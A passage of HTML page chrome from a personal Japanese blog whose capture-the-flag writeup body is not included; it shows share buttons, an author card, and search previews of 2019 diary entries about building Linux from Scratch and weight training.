              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        
      
      
        <li class="post-action">
          <a class="post-action-btn btn btn--default" href="#disqus_thread">
            <i class="fa fa-comment-o"></i>
          </a>
        </li>
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  
</div>

      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="1">
  <i id="btn-close-shareoptions" class="fa fa-close"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fngkz.github.io%2F2014%2F01%2Ftkbctf1-writeup%2F">
          <i class="fa fa-facebook-official"></i><span>Facebookで共有</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fngkz.github.io%2F2014%2F01%2Ftkbctf1-writeup%2F">
          <i class="fa fa-twitter"></i><span>Twitterで共有</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fngkz.github.io%2F2014%2F01%2Ftkbctf1-writeup%2F">
          <i class="fa fa-google-plus"></i><span>Google&#43;で共有</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="https://ngkz.github.io/mypicture.jpg" alt="プロフィール画像" />
    
    <h4 id="about-card-name">Kazutoshi Noguchi</h4>
    
      <div id="about-card-bio">I&rsquo;m interested in InfoSec, Trip, Electronics, and DIY.</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        System integrator
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        Japan
      </div>
    
  </div>
</div>

    <div id="algolia-search-modal" class="modal-container">
  <div class="modal">
    <div class="modal-header">
      <span class="close-button"><i class="fa fa-close"></i></span>
      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
        <span class="searchby-algolia-text text-color-light text-small">by</span>
        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
      </a>
      <i class="search-icon fa fa-search"></i>
      <form id="algolia-search-form">
        <input type="text" id="algolia-search-input" name="search"
          class="form-control input--large search-input" placeholder="検索" />
      </form>
    </div>
    <div class="modal-body">
      <div class="no-result text-color-light text-center"></div>
      <div class="results">
        
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190324/">
                <h3 class="media-heading">日記 2019/03/24(日)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>GCCのテストが通らない

<ul>
<li>フラグを全部削除してみたり、フラグを全部削除+PIE無効にしてみてもテストが通らない。</li>
<li><a href="http://www.linuxfromscratch.org/lfs/build-logs/8.3/i7-5820K/test-logs/087-gcc-8.2.0">LFSのビルドログでは全テストが通っている</a>ので、ビルド手順を間違ったか、ツールチェーンのカスタマイズに問題があるかもしれない</li>
<li>ビルド+テスト 1周に2-3時間はかかるのでかなりつらい</li>
</ul></li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<ul>
<li>休憩日</li>
<li>味がいまいちなソルティッドキャラメル味のインパクトホエイを使いきったので、ノンフレーバーのホエイプロテインに CAFE LATORY 抹茶と甘味料を入れて飲んでみた。カゼインと違ってプロテイン自体にほとんど味がないので1本で完全に抹茶味になった。おいしかった。</li>
</ul>

<h2 id="その他">その他</h2>

<ul>
<li>カーメイトのシガーソケット分配器の接点が凹んでしまっていたので分解して直した。なぜかケースの片側が発熱するパイロットランプにホットボンドで固定されていた。別の箇所でもう片側のケースにネジ止めされているから強度の問題はないんだけど、こんなものを付けるくらいなら強く押すと凹む接点をどうにかしてほしい</li>
<li>昨日もらったポータブル冷蔵庫のファンフィルターが汚れていたので分解清掃した。経年劣化で中のガムテープらしきものが全部剥がれてしまっていたので貼り替えた。</li>
</ul>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190322/">
                <h3 class="media-heading">日記 2019/03/22(金)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>昨日ビルドしたbinutilsのバイナリがなぜか非PIEになっていた。 ログを採って調べてみたら、テスト前にHardeningフラグを取り除いてPIEを無効にしたときにMakefileのタイムスタンプが変わったのが原因で、バイナリがPIE無効で再リンクされてしまていたことが分かった。<br />
<a href="https://github.com/ngkz/my-lfs-setup/commit/84551e209d17e9220912b057dc1c56d1814e353e">Makefileに細工するときにタイムスタンプが変わらないようにしたら解決した</a>。</li>
<li>MPFR,MPC,Shadowをインストールした。</li>
<li>GCCをビルドしている途中

<ul>
<li>nobodyユーザーに切り替えるとなぜか モードが<code>666</code>の<code>/dev/tty</code>が読めなくなった。<code>/</code>の所有者が<code>1000</code>でモードが<code>700</code>になっていたのが原因だった。</li>
<li>ほぼ全てのテストが失敗するので原因を調べてみたら、<code>/dev/pts</code>のマウントオプションが間違っていて<code>/dev/pts/ptmx</code>のモードが<code>000</code>になっていたのが原因だった。マウントオプションに<code>newinstance,ptmxmode=0666</code>を加えて解決。</li>
<li><code>/dev/pts/ptmx</code>を直したら大体のテストは通るようになったが、まだ何十ものテストが失敗している。テストに数時間かかるのでデバッグにかなり手間がかかりそう。</li>
</ul></li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190321/">
                <h3 class="media-heading">日記 2019/03/21(木)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>Binutilsのインストールが完了した

<ul>
<li>Hardening フラグを削除してもテストが失敗するのは GCCをDefault PIEでコンパイルしていたのが原因だった。</li>
<li>テストするときに、<code>CFLAGS</code>, <code>CXXFLAGS</code>, <code>CPPFLAGS</code>, <code>LDFLAGS</code>を取り除くだけでなく、<code>CC</code>と<code>CXX</code>に<code>-fno-PIE -no-pie</code>を加えてPIEを無効にしたら全テストが通るようになった</li>
</ul></li>
<li>GMPをインストールした</li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190320/">
                <h3 class="media-heading">日記 2019/03/20(水)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>Zlib, File, Readline, M4, Bcをインストールした</li>
<li>binutilsをビルド中

<ul>
<li>CPPFLAGSに<code>-D_FORTIFY_SOURCE=2</code>が入っているとlimits.hの存在チェックが壊れてビルドできななかった</li>
<li>CFLAGSとCXXFLAGSに<code>_FORTIFY_SOURCE</code>の定義を移して解決</li>
<li>ビルドが通るようになったがテストが通らない</li>
<li>CFLAGS, CXXFLAGS, CPPFLAGS, LDFLAGSを削除したらgold以外のテストは通るようになったので、 Hardening フラグのどれかが原因っぽい</li>
</ul></li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<ul>
<li>THE プレワークアウトを筋トレ30分前に1スクープ摂取</li>
<li>HMBを昼, トレーニング1時間前, 就寝前に1g摂取</li>
<li>前日の睡眠 7:23 (23:37-7:11)

<ul>
<li>あまりよく眠れなかった</li>
</ul></li>
<li>DiscordのJMusicBotをいじってたら時間がなくなってしまった</li>
</ul>

<p><strong>上半身プル</strong></p>

<table>
<thead>
<tr>
<th>種目</th>
<th>重量&amp;目標回数</th>
<th>回数</th>
<th>備考</th>
</tr>
</thead>

<tbody>
<tr>
<td>ハーフデッドリフト</td>
<td>3セット 30kg(27.5kgx2+シャフト) 21回以上</td>
<td>↓15 9 12</td>
<td>力を出しきれなかった</td>
</tr>

<tr>
<td>ワンハンドローイング</td>
<td>左右2セット 12.5kg(10kg+シャフト) 21回以上 →ドロップ</td>
<td>↓左15 右16 左17→5kgで12 右16→5kgで20</td>
<td></td>
</tr>

<tr>
<td>ダンベルシュラッグ</td>
<td>2セット 30kg(27.5kg+シャフトx2) 23回以上 →ドロップ</td>
<td>↓18 19</td>
<td></td>
</tr>

<tr>
<td>ダンベルカール</td>
<td>3セット 10kg(7.5kg+シャフト) 11回以上 →ドロップ</td>
<td></td>
<td>時間切れ</td>
</tr>

<tr>
<td>変形バックエクステンション</td>
<td>2セット 自重+5kg 16回以上 →ドロップ</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190319/">
                <h3 class="media-heading">日記 2019/03/19(火)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>lddが正常に動いていなかったのを直した

<ul>
<li><code>rtlddir</code>を<code>/usr/lib</code>に設定したとき <code>ldd</code>が64bitダイナミックリンカのパスとして <code>/usr/lib64/ld-linux-x86_64.so.2</code> を使っていたのが原因だった。</li>
<li><code>/usr/lib64</code>から<code>/usr/lib</code>へのシンボリックリンクを貼って解決</li>
</ul></li>
<li>ライセンス違反を解決

<ul>
<li>大部分がCC-BY-NC-SA 2.0のLFS Bookからの引用になったのに、リポジトリのライセンスが互換性のないGPLv3のままになっていた。</li>
<li>ライセンスをCC-BY-NC-SAに変更して解決</li>
</ul></li>
<li>Adjusting the Toolchain

<ul>
<li><code>/usr/lib32</code>に必要な32bitライブラリへのリンクを貼るのを忘れていたため、32bitでコンパイルできなかったのを直した</li>
</ul></li>
</ul>

<h2 id="筋トレ">筋トレ</h2></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190315/">
                <h3 class="media-heading">日記 2019/03/15(金)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>tzdataをパッケージ化してインストールした</li>
<li>タイムゾーンの設定をした</li>
<li>MarkdownでLFS Bookの中身を書き直すかわりに本家のBookをフォークしてそれにこっちの環境特有の変更を入れることにした。git-svnの使い方がまだよくわかっていないのでforkすらできていないが</li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<ul>
<li>THE プレワークアウトを筋トレ40分前に1スクープ摂取</li>
<li>HMBを夕, トレーニング40分前, 就寝前に1g摂取</li>
<li>前日の睡眠 7:32 (23:49→7:27)</li>
<li>カゼイン40g + 200mlの水にブレンディカフェラトリー濃厚抹茶とパラチニットスイート1本(1.2g)を入れて飲んだ。濃厚抹茶1本では味が薄すぎる感じ。カフェインが1本あたり20mg入ってるから就寝前に飲むカゼインに入れるには向いてないね</li>
</ul>

<p><strong>上半身プッシュ+腹筋</strong></p>

<table>
<thead>
<tr>
<th>種目</th>
<th>重量&amp;目標回数</th>
<th>回数</th>
<th>備考</th>
</tr>
</thead>

<tbody>
<tr>
<td>プッシュアップ</td>
<td>3セット 自重 10回以上 → 膝つき</td>
<td>↑10→2 9→6 7→4</td>
<td></td>
</tr>

<tr>
<td>ダンベルショルダープレス</td>
<td>2セット 25kg(10kg+シャフトx2) 12回以上 → ドロップ</td>
<td>↑13 12→10kgで15</td>
<td></td>
</tr>

<tr>
<td>ダンベルフレンチプレス</td>
<td>2セット 12.5kg(10kg+シャフト) 11回以上 → ドロップ</td>
<td>↑14 4→5kgで25</td>
<td></td>
</tr>

<tr>
<td>ダンベルフライ</td>
<td>2セット 20kg(7.5kg+シャフトx2) 15回以上 → ドロップ</td>
<td>↑16 10→12</td>
<td></td>
</tr>

<tr>
<td>ツイストクランチ</td>
<td>3セット 自重 5秒維持 23回以上</td>
<td>↓21 17 14</td>
<td></td>
</tr>
</tbody>
</table>

<h2 id="その他">その他</h2>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190314/">
                <h3 class="media-heading">日記 2019/03/14(木)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>パッケージの後処理スクリプトが完成

<ul>
<li>パッケージの全バイナリとライブラリをstripするスクリプトが完成
特定のファイルのデバッグ情報を分離して保持できるようにしてある</li>
<li>man圧縮スクリプトの処理内容を出力するようにした</li>
<li>後処理スクリプト自体もパッケージ化した</li>
</ul></li>
<li>全パッケージが新しい後処理スクリプトを使うようにした</li>
<li>必要なライブラリ以外はデバッグ情報を残さないようにした</li>
<li>glibcのパッケージ化とインストールが完了</li>
<li>今までの変更をリポジトリにコミットした</li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<p>休み</p>

<p>今日は夕飯を食べるのが遅かったので、消化されるのを待っていたら寝る時間になってしまった。最近寝不足気味なので今日は筋トレせずに<del>早く寝ることにする</del>。</p>

<p>LFSを組んでたら結局寝るのが遅くなってしまった。</p>

<h2 id="その他">その他</h2>

<ul>
<li>このサイトのデプロイスクリプトをシンプルにした <a href="https://github.com/ngkz/ngkz.github.io/blob/src/deploy.sh">https://github.com/ngkz/ngkz.github.io/blob/src/deploy.sh</a></li>
<li>DOOM Emacsのsmartparensの動作がおかしくてイライラするのでオフにした</li>
</ul>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190313/">
                <h3 class="media-heading">日記 2019/03/13(水)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>必要なライブラリ以外はデバッグ情報を残さないように変更 (途中)</li>
<li>パッケージの後処理(バイナリとライブラリのstrip, manページの圧縮, 不要なファイルを削除) をするスクリプトを改良している途中</li>
<li>数時間作業できたのにほとんど進捗がない。Ubuntu 14.04のサポート切れがせまっているので、迷ったらとりあえず本通りに先に進めるようにしたい。</li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<ul>
<li>HMBを昼, トレーニング30分前, 就寝前に1g摂取</li>
<li>前日の睡眠 7:09 (0:03→7：19)</li>
<li>2/18以降下半身の筋トレができてなかったので大幅に筋力が落ちていた

<ul>
<li>ヒップスラストは12月の水準まで落ちてしまっている</li>
</ul></li>
<li>カゼインプロテインにブレンディスティック カフェオレ やすらぎのカフェインレスを混ぜて飲んだ。おいしかった</li>
</ul>

<p><strong>下半身</strong></p>

<table>
<thead>
<tr>
<th>種目</th>
<th>重量&amp;目標回数</th>
<th>回数</th>
<th>備考</th>
</tr>
</thead>

<tbody>
<tr>
<td>ブルガリアンスクワット</td>
<td>3セット 自重+35kg(15kg+シャフト x 2) 左右14回以上 → 自重</td>
<td>↓左9 右7 左4→自重で15 右5→自重で8 左3 右 12.5kgx2で6</td>
<td>セット数間違えてた</td>
</tr>

<tr>
<td>シシースクワット</td>
<td>2セット 自重</td>
<td>13  14</td>
<td>やり方調べながら まだ慣れていないので力を出しきれなかった</td>
</tr>

<tr>
<td>ヒップスラスト</td>
<td>2セット 30kg(27.5kg+シャフト) 24回以上 →ドロップ</td>
<td>↓15 17→15kgで20?</td>
<td></td>
</tr>

<tr>
<td>レッグカール</td>
<td>2セット 22.5kg(20kg+シャフト) 11回以上 →ドロップ</td>
<td>↓8 2→12.5kgで21</td>
<td></td>
</tr>

<tr>
<td>片足スタンディングカーフレイズ</td>
<td>3セット 自重 左右23回以上</td>
<td>↓左19 右19? 左8? 右17 左21 右16</td>
<td></td>
</tr>
</tbody>
</table>

<h2 id="その他">その他</h2>

<ul>
<li>ヨドバシからまだ返品要求メールへの返信がこない</li>
</ul>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190312/">
                <h3 class="media-heading">日記 2019/03/12(火)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="linux-from-scratch">Linux from Scratch</h2>

<ul>
<li>ロケールのインストール</li>
<li>パッケージの後処理(バイナリとライブラリのstrip, manページの圧縮, 不要なファイルを削除) をするスクリプトを改良している途中</li>
</ul>

<h2 id="筋トレ">筋トレ</h2>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://ngkz.github.io/2019/03/diary-20190311/">
                <h3 class="media-heading">日記 2019/03/11(月)</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><h2 id="筋トレ">筋トレ</h2>

<ul>
<li>THE プレワークアウトを筋トレ30分前に1スクープ摂取</li>
<li>HMBを夕方, トレーニング1時間前, 就寝前に1g摂取</li>
<li>前日の睡眠 6時間未満</li>
<li>オーバーナイトリカバリーが無くなったのでカゼイン + バニラエッセンス + パラチニットスイート1本(1.2g, 砂糖5g相当) を飲んだ。バニラエッセンスを12滴も入れたのに、なぜかバニラの香りがほとんどしない</li>
</ul>

<p><strong>上半身プッシュ</strong></p>

<table>
<thead>
<tr>
<th>種目</th>
<th>重量&amp;目標回数</th>
<th>回数</th>
<th>備考</th>
</tr>
</thead>

<tbody>
<tr>
<td>ローテーターカフのウォームアップ</td>
<td></td>
<td></td>
<td></td>
</tr>

<tr>
<td>プッシュアップ</td>
<td>3セット 自重 10回以上 → 膝つき</td>
<td>→ 9→3 5→3 4→4</td>
<td></td>
</tr>

<tr>
<td>ダンベルショルダープレス</td>
<td>2セット 25kg(10kg+シャフトx2) 11回以上 → ドロップ</td>
<td>↑11 9→10kgで20</td>
<td></td>
</tr>

<tr>
<td>ダンベルフレンチプレス</td>
<td>2セット 12.5kg(10kg+シャフト) 12回以上 → ドロップ</td>
<td>↓10 11→5kgで15</td>
<td></td>
</tr>

<tr>
<td>ダンベルフライ</td>
<td>2セット 20kg(7.5kg+シャフトx2) 13回以上 → ドロップ</td>
<td>↑14 12→10kgで20</td>
<td></td>
</tr>

<tr>
<td>ツイストクランチ</td>
<td>3セット 自重 5秒維持 23回以上</td>
<td></td>
<td>時間切れ</td>
</tr>
</tbody>
</table>

<h2 id="その他">その他</h2>

<ul>
<li>雨が降って車が1日もたたないうちにドロドロになった :(</li>
</ul>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
      </div>
    </div>
    <div class="modal-footer">
      <p class="results-count text-medium"
         data-message-zero=""
         data-message-one=""
         data-message-other="">
         82 posts found
      </p>
    </div>
  </div>
</div>
    
  
    
    <div id="cover" style="background-image:url('https://ngkz.github.io/images/cover.jpg');"></div>
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>


<script src="https://ngkz.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>


<script lang="javascript">
window.onload = updateMinWidth;
window.onresize = updateMinWidth;
document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
function updateMinWidth() {
  var sidebar = document.getElementById("sidebar");
  var main = document.getElementById("main");
  main.style.minWidth = "";
  var w1 = getComputedStyle(main).getPropertyValue("min-width");
  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
}
</script>

<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight > code, pre > code').each(function(i, block) {
    if (!$(this).hasClass('codeblock')) {
      $(this).addClass('codeblock');
    }
    hljs.highlightBlock(block);
  });
});
</script>


  
    
      <script>
        var disqus_config = function () {
          this.page.url = 'https:\/\/ngkz.github.io\/2014\/01\/tkbctf1-writeup\/';
          
            this.page.identifier = '\/2014\/01\/tkbctf1-writeup\/'
          
        };
        (function() {
          
          
          if (window.location.hostname == "localhost") {
            return;
          }
          var d = document, s = d.createElement('script');
          var disqus_shortname = 'ngkz-log';
          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    
  




    
  </body>
</html>

